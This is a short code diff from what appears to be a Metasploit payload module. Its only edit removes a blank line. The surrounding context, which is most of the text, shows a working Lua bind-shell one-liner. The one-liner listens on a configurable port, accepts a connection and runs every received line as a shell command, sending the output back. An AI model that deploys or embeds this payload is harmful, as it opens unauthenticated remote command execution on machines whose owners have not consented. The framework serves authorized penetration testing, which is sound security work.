@@ -50,6 +50,5 @@ module MetasploitModule
   def command_string
     "lua -e \"local s=require('socket');local s=assert(socket.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
   end
-
 end
 
